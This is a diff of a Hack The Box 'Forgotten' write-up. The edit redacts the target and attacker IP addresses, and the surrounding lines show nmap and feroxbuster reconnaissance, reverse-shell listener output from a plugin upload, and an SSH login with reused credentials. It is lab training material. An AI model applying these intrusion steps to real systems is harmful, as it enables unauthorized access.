@@ -20,11 +20,11 @@ difficulty: Easy
 ❯ sudo nmap -p- --min-rate 1200 --open -sS -Pn -n -vvv -oG allports $target
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 12:38 CEST
 Initiating SYN Stealth Scan at 12:38
-Scanning 10.129.13.225 [65535 ports]
-Discovered open port 22/tcp on 10.129.13.225
-Discovered open port 80/tcp on 10.129.13.225
+Scanning 10.129.xx.xx [65535 ports]
+Discovered open port 22/tcp on 10.129.xx.xx
+Discovered open port 80/tcp on 10.129.xx.xx
 Completed SYN Stealth Scan at 12:39, 30.05s elapsed (65535 total ports)
-Nmap scan report for 10.129.13.225
+Nmap scan report for 10.129.xx.xx
 Host is up, received user-set (0.043s latency).
 Scanned at 2025-09-26 12:38:38 CEST for 30s
 Not shown: 59378 closed tcp ports (reset), 6155 filtered tcp ports (no-response)
@@ -43,7 +43,7 @@ Scripts and versions.
 ```
 ❯ nmap -p22,80 -sCV -Pn -oN targeted $target
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 12:39 CEST
-Nmap scan report for 10.129.13.225
+Nmap scan report for 10.129.xx.xx
 Host is up (0.042s latency).
 
 PORT   STATE SERVICE VERSION
@@ -77,7 +77,7 @@ We get a 403 error when trying to see the webpage.
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
 by Ben "epi" Risher                    ver: 2.11.0
 ───────────────────────────┬──────────────────────
-     Target Url            │ http://10.129.13.225
+     Target Url            │ http://10.129.xx.xx
      Threads               │ 50
      Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
      Status Codes          │ All Status Codes!
@@ -94,7 +94,7 @@ by Ben "epi" Risher                    ver: 2.11.0
 ──────────────────────────────────────────────────
 403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
 404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-301      GET        9l       28w      315c http://10.129.13.225/survey => http://10.129.13.225/survey/
+301      GET        9l       28w      315c http://10.129.xx.xx/survey => http://10.129.xx.xx/survey/
 ```
 
 We found the directory `survey`, so let's take a look.
@@ -155,18 +155,18 @@ We upload the zipped plugin and make a curl to the endpoint to trigger the revsh
 ![](/img/htb_img/Forgotten_img/img10.png)
 
 ```
-[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.0.2.15 • 10.10.14.49 • 172.17.0.1
+[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.0.2.15 • 10.10.xx.xx • 172.17.0.1
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-[+] Got reverse shell from efaa6f5097ed~10.129.13.225-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Got reverse shell from efaa6f5097ed~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
-[+] Attempting to spawn a reverse shell on 10.10.14.49:4444
-[+] Got reverse shell from efaa6f5097ed~10.129.13.225-Linux-x86_64 😍 Assigned SessionID <2>
+[+] Attempting to spawn a reverse shell on 10.10.xx.xx:4444
+[+] Got reverse shell from efaa6f5097ed~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <2>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/script! 💪
 [+] Shell upgraded successfully using /usr/bin/script! 💪
 [+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/repentance/.penelope/sessions/efaa6f5097ed~10.129.13.225-Linux-x86_64/2025_09_26-13_10_26-277.log 📜
+[+] Logging to /home/repentance/.penelope/sessions/efaa6f5097ed~10.129.xx.xx-Linux-x86_64/2025_09_26-13_10_26-277.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 [-] Spawn MANUALLY a new shell for this session to operate properly
 limesvc@efaa6f5097ed:/$ 
@@ -242,7 +242,7 @@ _=/usr/bin/env
 Using the same username and the password, we can login directly to ssh.
 ```sh
 ❯ ssh limesvc@$target
-(limesvc@10.129.13.225) Password: 
+(limesvc@10.129.xx.xx) Password: 
 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1033-aws x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -253,7 +253,7 @@ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1033-aws x86_64)
 
   System load:  0.02              Processes:             228
   Usage of /:   59.5% of 6.60GB   Users logged in:       0
-  Memory usage: 12%               IPv4 address for eth0: 10.129.13.225
+  Memory usage: 12%               IPv4 address for eth0: 10.129.xx.xx
   Swap usage:   0%
 
 
